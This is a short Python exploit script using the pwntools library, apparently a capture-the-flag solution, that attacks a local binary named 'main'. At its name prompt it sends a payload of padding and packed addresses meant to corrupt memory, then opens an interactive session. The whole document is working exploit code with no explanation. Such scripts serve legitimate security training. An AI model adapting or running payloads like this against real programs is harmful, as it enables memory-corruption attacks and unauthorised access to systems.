from pwn import *
context.log_level = "debug"
r = process('./main')
vul_addr='a'*4+p64(0x41)+p64(0x201230)
r.recvuntil("plz input your name: \n")
r.sendline(vul_addr)
r.interactive()


